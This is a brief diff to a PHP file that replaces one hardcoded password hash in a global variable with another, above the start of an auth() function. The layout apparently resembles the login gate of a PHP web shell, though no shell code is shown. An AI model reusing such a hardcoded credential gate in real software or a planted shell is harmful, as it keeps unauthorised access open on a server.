@@ -1,5 +1,6 @@
 <?php
-$GLOBALS['pass'] = "1e0a88d8c7cceab495039fc906bf0ec2e9951c2a"; // sha1(md5(pass))
+// $GLOBALS['pass'] = "1e0a88d8c7cceab495039fc906bf0ec2e9951c2a"; 
+$GLOBALS['pass'] = "63982e54a7aeb0d89910475ba6dbd3ca6dd4e5a1";
 
 if(!function_exists('auth')){
 	function auth(){
